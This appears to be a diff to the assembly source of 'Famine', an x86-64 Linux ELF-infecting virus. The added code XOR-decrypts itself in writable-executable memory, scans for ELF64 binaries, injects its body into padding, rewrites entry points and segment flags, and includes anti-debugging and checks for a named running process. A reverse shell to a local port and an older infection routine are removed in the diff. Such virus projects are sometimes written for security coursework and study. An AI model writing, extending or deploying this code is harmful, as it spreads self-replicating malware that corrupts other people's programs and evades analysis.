@@ -9,57 +9,94 @@ section .text
 ; %rdi %rsi %rdx %r10 %r8 %r9
 
 _start:
-	PUSH_ALL
-	mov		rax, SYS_open
-	lea		rdi, [rel self]
-	xor		rsi, rsi
-	xor		rdx, rdx
-	syscall
-	cmp		rax, 0
-
-	jle		.just_quit
-	mov		r12, rax
-
-	mov		rax, SYS_pread64
-	mov		rdi, r12
-	lea		rsi, [rel zero]
-	mov		rdx, 1
-	mov		r10, 10
-	syscall
-
-	.just_quit:
-	mov		rax, SYS_close
-	mov		rdi, r12
-	syscall
-	POP_ALL
-	mov		al, BYTE [rel zero]	; SI ICI = 0, ca signfiie c'est famine
-	test	al, al
-	jz		.continue
-
-	mov		rax, SYS_fork
-	syscall
-	cmp		eax, 0
-	jng		.continue_fork
-
-	mov		rax, [rel entry]
-	mov		[rel new_entry], rax
-	mov		rax, [rel new_entry]
-	sub		rax, [rel old_entry]
-	lea		rdi, [rel _start]
-	sub		rdi, rax
-	mov		[rel new_entry], rdi
-
-	jmp		[rel new_entry]
-
-.continue_fork:
-	mov		rax, SYS_setsid
-	syscall
-.continue:
+	call	_xor_decrypt
 	PUSH_ALL
 	jmp		end_
 
-print_rax:
+_xor_decrypt:
+	push rsi
+	push rdi
+	push rcx
+	push rdx
+	push rbx
+	push rax
+	push r8
+	push r9
+	push r10
 
+	; Calculate the actual size to decrypt
+	lea rax, [rel end_addr]
+	lea rcx, [rel _encrypted_start]
+	sub rax, rcx
+	mov r8, rax                    ; r8 = actual size to decrypt
+	
+	; Get page-aligned start address
+	lea rsi, [rel _encrypted_start]
+	mov rdi, rsi
+	and rdi, ~0xFFF                ; Page align start (clear lower 12 bits)
+	
+	; Calculate total pages needed
+	lea rax, [rel end_addr]
+	sub rax, rdi                   ; Total span from page start to end
+	add rax, 4095                  ; Round up to next page
+	and rax, ~4095                 ; Clear lower 12 bits = page aligned size
+	
+	; Change memory protection
+	mov r9, rax                    ; Save the page-aligned size
+	mov rax, 10                    ; SYS_mprotect
+	mov rsi, r9                    ; page-aligned size  
+	mov rdx, 7                     ; PROT_READ|PROT_WRITE|PROT_EXEC
+	syscall
+	
+	test rax, rax
+	js .skip_decrypt               ; Skip if mprotect failed
+
+	; Now decrypt - match the encryption algorithm exactly
+	lea rsi, [rel _encrypted_start]
+	mov rcx, r8                    ; Total size
+	xor r10, r10                   ; r10 = byte counter (like 'i' in C)
+	
+	; Create key bytes lookup
+	mov rbx, 0xdeadbeefdeadbeef
+	sub rsp, 8
+	mov [rsp], rbx                 ; Store key on stack for byte access
+
+.xor_loop:
+	test rcx, rcx
+	jz .done
+	
+	; Calculate key byte: k[i % 8]
+	mov rax, r10
+	and rax, 7                     ; rax = i % 8
+	mov al, byte [rsp + rax]       ; al = k[i % 8]
+	
+	; XOR with current byte
+	mov bl, byte [rsi]
+	xor bl, al
+	mov byte [rsi], bl
+	
+	inc rsi
+	inc r10                        ; Increment byte counter
+	dec rcx
+	jmp .xor_loop
+
+.done:
+	add rsp, 8                     ; Restore stack
+.skip_decrypt:
+	pop r10
+	pop r9
+	pop r8
+	pop rax
+	pop rbx
+	pop rdx
+	pop rcx
+	pop rdi
+	pop rsi
+	ret
+_encrypted_start:
+	
+
+print_rax:
     PUSH_ALL
     ; Utilisation d’un buffer sur la pile
     sub     rsp, 64             ; réserver 32 bytes
@@ -108,8 +145,6 @@ print_rax:
 		add		rax, rdx          ; rax += (base % 0x1000)
 		POP_ALLr
 	ret
-
-
 
 	printf: ; lea rsi
 		push	rax
@@ -356,9 +391,6 @@ print_rax:
 		.file:
 			;call	printf ;logique des fichier
 
-
-
-
 			push	rdi
 			push	rsi
 			push	rax
@@ -371,19 +403,15 @@ print_rax:
 
 			;call	printf
 
-			call	infection_1
+			call	check_binary
+			; jz .no_print
 
-
-
-
-
-
+			; call infection_0
 			; ici logique des fichier
 		.no_print:
 			add		rsi, rcx
 			jmp		.loop
 		.done:
-
 
 		pop		rdi
 		mov		rax, SYS_close
@@ -398,6 +426,70 @@ print_rax:
 		; elfp0
 		;movzx	rcx, e_phnum
 		;movzx	rdi, e_phentisize
+
+	check_binary:
+		PUSH_ALL
+	
+		; open(path, O_RDWR)
+		mov     rax, SYS_open
+		lea     rdi, [rel path]
+		mov     rsi, 2 ; O_RDWR
+		xor     rdx, rdx
+		syscall
+		cmp     rax, 0
+		jl      .ret
+		mov     r12, rax ; save fd
+	
+		; fstat(fd, &stat)
+		mov     rdi, r12
+		sub     rsp, 144 ; struct stat buffer
+		mov     rax, SYS_fstat
+		mov     rsi, rsp
+		syscall
+		cmp     rax, 0
+		jl      .ret_restore
+	
+		; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
+		mov     rsi, [rsp + 48]
+		mov     rax, SYS_mmap
+		mov     rdi, 0
+		mov     rdx, PROT_READ | PROT_WRITE
+		mov     r10, MAP_SHARED
+		mov     r8, r12
+		mov     r9, 0
+		syscall
+		cmp     rax, -4095
+		jae     .ret_restore
+
+		; check is elf
+		cmp dword [rax], 0x464c457f
+		jne .ret_restore
+
+		; check is elf64
+		cmp byte [rax + 0x4], 0x2
+		jne .ret_restore
+
+		; check for signature
+		; signature = file_start + padding - (end - signature)
+		mov rdx, [rsp + 48]
+		mov rdi, rax
+		add rdi, rdx
+		sub rdi, (end_addr - signature)
+
+		xor rax, rax
+		mov rsi, signature
+		call ft_strcmp
+		cmp eax, 0
+		je .ret_restore
+
+		call infection_0
+	.ret_restore:
+		add     rsp, 144
+	.ret:
+		POP_ALL
+		ret
+		
+
 	infection_0:
 		PUSH_ALLr
 
@@ -405,7 +497,6 @@ print_rax:
 		mov		qword [rel p_offset], 0
 		mov		qword [rel p_vaddr], 0
 		mov		qword [rel p_paddr], 0
-
 
 		mov		qword [rel p_offset],  0
 
@@ -464,12 +555,9 @@ print_rax:
 		cmp		r13, 1
 		je		.return
 
-
-		cmp		r13, 1
 		mov		rax, [rel p_vaddr]
 		;add		rax, [rel elfb + ehdr.e_shoff]
 		;add		rax, r15	-> Tant que ca crash pas on add pas!
-
 
 		mov		rdx, [rel p_offset]
 
@@ -487,6 +575,7 @@ print_rax:
 		mov		rdx, 56
 		mov		r10, r11
 		syscall
+
 		;  LOAD           0x0000000000024770 0x0000000000026770 0x0000000000026770
 		; New Entry
 		mov		rax, SYS_pwrite64
@@ -496,7 +585,6 @@ print_rax:
 		mov		r10, ehdr.e_entry
 		syscall
 
-
 		mov		rax, SYS_pwrite64
 		mov		rdi, r12
 		lea		rsi, [rel one]
@@ -505,7 +593,6 @@ print_rax:
 		syscall
 
 		; write famine
-
 		; 15952 ->21088
 		lea		rsi, [rel _start]
 		mov		rdx, FAMINE_SIZE_NO_BSS
@@ -521,266 +608,26 @@ print_rax:
 		POP_ALLr
 	ret
 
-
-
-	infection_1:		; rsi nom du fichier
-		PUSH_ALL
-
-
-		mov		rax, SYS_open
-		lea		rdi, [rel path]
-		mov		rsi, 2
-		xor		rdx, rdx
-		syscall
-
-		lea		rsi, [rel path]
-		call	sub_val
-
-		cmp		rax, 0
-		jle		.return
-		mov		r12, rax
-
-		lea		rdi, [rel elfb]	; Cleaning du buffer elfb -> La ou y va avoir le elf header
-		mov		rcx, 8
-		xor		rax, rax
-		rep		stosq
-
-		lea		rdi, [rel elfp0]	; Cleaning du buffer elfp0
-		mov		rcx, 7
-		xor		rax, rax
-		rep		stosq
-
-		lea		rdi, [rel elfp1]	; Cleaning du buffer elfp1
-		mov		rcx, 7
-		xor		rax, rax
-		rep		stosq
-
-		mov		rax, SYS_read
-		mov		rdi, r12
-		lea		rsi, [rel elfb]
-		mov		rdx, 64
-		syscall
-		; START - CHECKS - ELF64
-		mov		rcx, 4
-		lea		rsi, [rel elfh]
-		lea		rdi, [rel elfb]
-		repe	cmpsb
-		test	rcx, rcx
-		jnz		.close_file		; On verifie le nombre magique
-
-		cmp		byte [rel elfb + 4], 2	; On verifie que c'est bien un elf64
-		jne		.close_file
-
-		mov		al, [rel elfb + 0xa]	; Check si deja infecte
-		test	al, al
-		jnz		.close_file
-		; END - CHECKS - ELF64
-
-
-
-		; On essaye la 1ere methode d'infection!
-
-
-		; Here start the injection
-
-
-
-		mov		rax, [rel elfb + 0x18]		; e_entry
-		mov		[old_entry], rax
-
-
-		movzx	rcx, word [rel elfb + 0x38]	; e_phnum
-		movzx	rdi, word [rel elfb + 0x36]	; e_phentisize
-		xor		r11, r11
-		xor		r10, r10
-
-
-
-
-		call	infection_0
-		test	rax, rax
-		jz		.close_file
-
-		lea		rdi, [rel elfp0]	; Cleaning du buffer elfp0
-		mov		rcx, 7
-		xor		rax, rax
-		rep		stosq
-
-		lea		rdi, [rel elfp1]	; Cleaning du buffer elfp1
-		mov		rcx, 7
-		xor		rax, rax
-		rep		stosq
-
-
-		movzx	rcx, word [rel elfb + 0x38]	; e_phnum
-		movzx	rdi, word [rel elfb + 0x36]	; e_phentisize
-		xor		r11, r11
-		xor		r10, r10
-
-		; call _add_empty_section
-		.start_loop_phdr:
-			test	rcx, rcx
-			jz		.end_loop_phdr
-			mov		r10, rcx
-			sub		r10, rcx
-			imul	r10, rdi
-			add		r10, 64
-			push	r11
-			push	rcx
-			push	rdi
-			mov		rdi, r12
-			mov		rdx, 0x38
-			lea		rsi, [rel elfp0]
-			mov		rax, SYS_pread64
-			syscall
-			pop		rdi
-			pop		rcx
-			pop		r11
-			xor		rax, rax
-			; r9 -> target_phdr offset
-			cmp		dword [rel elfp0], 1 ; est-ce un load ?
-			jne		.next_it_phdr
-			mov		rax, qword [rel elfp0 + phdr.p_offset]  ; p_offset
-			add		rax, qword [rel elfp0 + phdr.p_filesz] ; p_filesz
-
-			cmp		rax, r11
-			jna		.next_it_phdr
-			mov		r11, rax
-			mov		r9, r10
-
-			push	r11
-			push	rcx
-			push	rdi
-			mov		rdi, r12
-			mov		rdx, 0x38
-			lea		rsi, [rel elfp1]
-			mov		rax, SYS_pread64
-			syscall
-			pop		rdi
-			pop		rcx
-			pop		r11
-
-		.next_it_phdr:
-			dec		rcx
-			jmp		.start_loop_phdr
-		.end_loop_phdr:
-			test	r11, r11
-			jz		.close_file
-			; check padding size
-			; padding = next_header_off - (curr_header_off + header_size)~
-			mov		rax, [rel elfp1 + phdr.p_offset] ; p_offset next
-			mov		rdx, [rel elfp0 + phdr.p_offset] ; p_offset curr seg
-			add		rdx, [rel elfp0 + phdr.p_filesz]
-			sub		rax, rdx
-			; padding < FAMINE_SIZE
-			cmp		rax, FAMINE_SIZE
-			jl		.close_file
-		.skip:
-			; mark file for avoid re-infection
-			push	r9
-			push	r11
-			mov		rax, SYS_pwrite64
-			mov		rdi, r12
-			lea		rsi, [rel one]
-			mov		rdx, 1
-			mov		r10, 0xa
-			syscall
-			pop		r11
-			pop		r9
-
-			; compute new entry point
-			push	r11
-			mov		rax, [rel elfp1 + phdr.p_offset]
-			sub		r11, rax
-			mov		rax, [rel elfp1 + phdr.p_vaddr]
-			add		r11, rax
-			mov		[rel entry], r11
-			pop		r11
-
-			; write new entry point
-			push	r9
-			push	r11
-			mov		rax, SYS_pwrite64
-			mov		rdi, r12
-			lea		rsi, [rel entry]
-			mov		rdx, 8
-			mov		r10, 0x18
-			syscall
-			pop		r11
-			pop		r9
-
-			; write exec flag in p_flags
-			push	r9
-			push	r11
-			mov		rax, SYS_pwrite64
-			mov		rdi, r12
-			lea		rsi, [rel exec]
-			mov		rdx, 4
-			mov		r10, r9
-			add		r10, 0x4
-			syscall
-			pop		r11
-			pop		r9
-
-			; compute p_filesz
-			push	r11
-			mov		rdi, [rel elfp1 + phdr.p_filesz]
-			add		rdi, FAMINE_SIZE
-			mov		[rel elfp1 + phdr.p_filesz], rdi
-
-			; compute p_memsz
-			mov		rdi, qword [rel elfp1 + phdr.p_memsz]
-			add		rdi, FAMINE_SIZE_NO_BSS
-			mov		[rel elfp1 + phdr.p_memsz], rdi
-			pop		r11
-
-			; write p_filesz
-			push	r9
-			push	r11
-			mov		rax, SYS_pwrite64
-			mov		rdi, r12
-			lea		rsi, [rel elfp1 + phdr.p_filesz]
-			mov		rdx, 8
-			mov		r10, r9
-			add		r10, 0x20
-			syscall
-			pop		r11
-			pop		r9
-
-			; write p_memsz
-			push	r9
-			push	r11
-			mov		rdi, r12
-			lea		rsi, [rel elfp1 + phdr.p_memsz]
-			mov		rdx, 8
-			mov		r10, r9
-			add		r10, 0x28
-			mov		rax, SYS_pwrite64
-			syscall
-			pop		r11
-			pop		r9
-
-			; write famine
-			push	r11
-			push	r9
-			lea		rsi, [rel _start]
-			mov		rdx, FAMINE_SIZE_NO_BSS
-			mov		r10, r11
-			mov		rdi, r12
-			mov		rax, SYS_pwrite64
-			syscall
-			pop		r9
-			pop		r11
-
-	.close_file:
-		mov		rax, SYS_close
-		mov		rdi, r12
-		syscall
-	.return:
-		POP_ALL
-	ret
-
 end_:
+	; check if tracer
+	; call _is_debugged
+	; test rax, rax
+	; jz .just_quit
+
+	; check active forbidden process
+	; call _check_forbidden_process
+	; cmp rax, 1
+	; je .just_quit
+
+	mov		rax, [rel entry]
+	mov		[rel new_entry], rax
+
+	mov		rax, [rel new_entry]
+	sub		rax, [rel old_entry]
+	lea		rdi, [rel _start]
+	sub		rdi, rax
+
+	mov		[rel new_entry], rdi
 
 	call	famine
 
@@ -789,7 +636,6 @@ end_:
 	xor		rsi, rsi
 	xor		rdx, rdx
 	syscall
-
 	cmp		rax, 0
 	jle		.just_quit
 	mov		r12, rax
@@ -806,93 +652,197 @@ end_:
 	mov		rdi, r12
 	syscall
 
-
 	.just_quit:
 		POP_ALL
+		mov		al, BYTE [rel zero]
+		test	al, al
+		jz		.exit_ret
 
-		mov		rax, SYS_fork
-		syscall
-
-		cmp		eax, 0
-		jng		.continue_fork
-
-		mov		rax, SYS_exit
-		xor		rdi, rdi
-		syscall
-
-	.continue_fork:
-		mov		rax, SYS_setsid
-		syscall
-
-		mov		rax, SYS_socket
-		mov		rdi, AF_INET
-		mov		rsi, SOCK_STREAM
-		xor		rdx, rdx
-		syscall
-		mov		r12, rax
-
-		mov		rax, SYS_connect
-		mov		rdi, r12
-		lea		rsi, [rel serv_addr]
-		mov		rdx, 16
-		syscall
-		test	rax, rax
-		jnz		.exit_ret
-
-		mov		rax, SYS_dup2
-		mov		rdi, r12
-		mov		rsi, 0
-		syscall
-		mov		rax, SYS_dup2
-		mov		rdi, r12
-		mov		rsi, 1
-		syscall
-		mov		rax, SYS_dup2
-		mov		rdi, r12
-		mov		rsi, 2
-		syscall
-		lea		rax, [rel arg0]
-		mov		[rel argv], rax
-		mov		rax, SYS_execve
-		lea		rdi, [rel shell]
-		lea		rsi, [rel argv]
-		xor		rdx, rdx
-		syscall
+		jmp		[rel new_entry]
 
 	.exit_ret:
-		mov		rax, SYS_close
-		mov		rdi, r12
-		syscall
-
 		mov		rax, SYS_exit
 		xor		rdi, rdi
 		syscall
 
+; Anti debug ---
+_is_debugged:
+	mov rdi, 0
+	mov rax, SYS_ptrace
+	xor rsi, rsi
+	xor rdx, rdx
+	xor r10, r10
+	syscall
+	ret
+
+; Check forbidden process ---
+_check_forbidden_process:
+    mov     rax, SYS_open
+    lea     rdi, [rel proc_prefix]
+    xor     rsi, rsi
+    xor     rdx, rdx
+    syscall
+    cmp     rax, 0
+    jl      .ret
+    mov     r12, rax               ; save fd
+
+.read_dir:
+    mov     rax, SYS_getdents64
+    mov     rdi, r12
+    lea     rsi, [rel buff]
+    mov     rdx, 4096
+    syscall
+    cmp     rax, 0
+    jle     .close_getdents ; 0 = EOF, <0 = error
+    mov     r14, rax    ; bytes read
+    xor     r13, r13  ; offset = 0
+
+.read_getdents_entry:
+    cmp     r13, r14
+    jge     .read_dir   
+
+    lea     rdi, [rel buff]
+    add     rdi, r13
+    movzx   r10, word [rdi + 16]       ; d_reclen
+    mov     al, byte [rdi + r10 - 1]   ; d_type
+    lea     rsi, [rdi + 18]            ; pointer to d_name
+    add     r13, r10                   ; advance offset
+
+    cmp     al, DT_DIR
+    jne     .read_getdents_entry     
+
+    push    rsi                      
+	mov r15, rsi
+    call    _parse_dir              
+
+.loop:
+	pop rsi
+	jmp .read_getdents_entry
+
+.close_getdents:
+	mov rax, SYS_close
+	mov rdi, r12
+	syscall
+
+.ret:
+	mov rax, 0
+	ret
+
+
+; parse process dir ---
+_parse_dir:
+	mov rdi, r15  
+	lea rdx, [rel path_buffer]    
+
+	; Copy "/proc/"
+	lea rsi, [rel proc_prefix]
+.copy_proc:
+	lodsb
+	test al, al
+	jz .copy_pid
+	stosb
+	jmp .copy_proc
+
+.copy_pid:
+	mov rsi, r15
+.copy_pid_loop:
+	lodsb
+	test al, al
+	jz .copy_comm
+	stosb
+	jmp .copy_pid_loop
+
+.copy_comm:
+	lea rsi, [rel comm_path]
+.copy_comm_loop:
+	lodsb
+	test al, al
+	jz .open_comm
+	stosb
+	jmp .copy_comm_loop
+
+.open_comm:
+	mov rax, SYS_open
+	lea rdi, [rel path_buffer]
+	xor rsi, rsi ; O_RDONLY
+	xor rdx, rdx
+	syscall
+	test rax, rax
+	js .ret_continue
+	mov r12, rax        ; save fd
+
+.read_comm:
+	mov rdi, r12
+	mov rax, SYS_read
+	lea rsi, [rel comm_buff]
+	mov rdx, 7
+	syscall
+	test rax, rax
+	jle .close_comm
+
+.check_match:
+	lea rsi, [rel comm_buff]
+	lea rdi, [rel forbidden_process]
+	call ft_strcmp
+	cmp eax, 0
+	je .forbidden_found
+
+.close_comm:
+	mov rdi, r12
+	mov rax, SYS_close
+	syscall
+
+.ret_continue:
+	ret
+
+.forbidden_found:
+	mov rdi, r12
+	mov rax, SYS_close
+	syscall
+	mov rax, 1         ; signal forbidden process found
+	ret
+
+
+; Utils ---
+ft_strcmp:
+	PUSH_ALL
+	xor eax, eax
+	.loop:
+		mov al, [rdi]
+		mov dl, [rsi]
+		cmp al, dl
+		jne .diff
+		test al, al
+		je .done
+		inc rdi
+		inc rsi
+		jmp .loop
+	.diff:
+		sub eax, edx
+	.done:
+		POP_ALL
+		ret
+
 ; -----
+elfb	times 0064 db 0
+file	db 'elf64 found!', 0
+signature	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
+old_entry		   dq 0
+new_entry		   dq 0
+self	db '/proc/self/exe', 0
+last	db '..', 0
+curr	db '.', 0
+elfh	db 0x7f, 'ELF'
+one		db 1
+zero	db 0
+paddi	dq 0
+entry	dq 0
+exec	dd 7
 
-
-	elfb	times 0064 db 0
-	file	db 'elf64 found!', 0
-	msg1	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
-	old_entry		   dq 0
-	new_entry		   dq 0
-	self	db '/proc/self/exe', 0
-	last	db '..', 0
-	curr	db '.', 0
-	elfh	db 0x7f, 'ELF'
-	one		db 1
-	zero	db 0
-	paddi	dq 0
-	entry	dq 0
-	exec	dd 7
-	serv_addr:
-		dw AF_INET
-		dw 0x901F			; 8080
-		dd 0x0100007F		; 127.0.0.1
-		times 8 db 0
-		shell:	db '/bin/sh', 0
-		arg0:       db "sh", 0
-		argv:       dq 0, 0
+; forbidden process
+proc_prefix db '/proc/', 0
+comm_path db '/comm', 0
+forbidden_process db 'cursor', 0
 
 ; NEW HEADER
 new_programheader:
@@ -911,5 +861,7 @@ new_programheader:
 buffer_bss:
 	padd	times 0512 db 0
 	buff	times 4096 db 0
+	comm_buff times 7 db 0
+	path_buffer times 64 db 0
 
 end_addr:
